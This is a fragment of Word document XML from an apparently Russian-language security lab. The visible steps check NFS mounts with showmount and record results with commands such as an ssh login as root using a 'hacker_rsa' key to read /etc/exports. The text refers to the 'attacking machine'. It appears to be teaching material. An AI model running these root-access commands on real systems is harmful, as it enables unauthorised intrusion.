        <w:t>k;</w:t>
      </w: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rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">showmount </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">a 192.168.50.121 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>убедимся</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">ip </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>адрес атакующей машины исчез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</w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4475956" cy="1881091"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741850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0.png" descr="image1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56" cy="18810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  <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>адрес не исчезает</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">df -k </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>не показывает файловую систему</w:t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i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">6) 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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Оформление результатов работы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i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pP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rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Последовательно выведем в консоль результаты выполнения следующих команд и сделаем один </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>или два</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>скриншота</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="720" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ssh -i /root/.ssh/hacker_rsa root@ MS_IP "cat /etc/exports"</w:t>
      </w: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en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ssh -i /root/.ssh/hacker_rsa root@ MS_IP "date"</w:t>
      </w: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nl-NL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t>date</w:t>
      </w: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es-ES_tradnl"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
        <w:t>echo "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Ф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  <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>И</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>О</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">проводившего работу </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:u w:val="none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201833</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4179789" cy="31407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789" cy="3140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i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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  <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:sectPr>
      <w:headerReference w:type="default" r:id="rId31"/>
      <w:footerReference w:type="default" r:id="rId32"/>
      <w:pgSz w:w="11900" w:h="16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Robo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5"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9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6"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль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7"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль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8"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 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9"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 9"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:suff w:val="tab"/>
      <w:lvlText w:val="●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trackRevisions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  <w:style w:type="numbering" w:styleId="Импортированный стиль 5">
    <w:name w:val="Импортированный стиль 5"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 6">
    <w:name w:val="Импортированный стиль 6"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 7">
    <w:name w:val="Импортированный стиль 7"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="13"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 8">
    <w:name w:val="Импортированный стиль 8"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="15"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 9">
    <w:name w:val="Импортированный стиль 9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1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1.jpe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numbering" Target="numbering.xml"/><Relationship Id="rId3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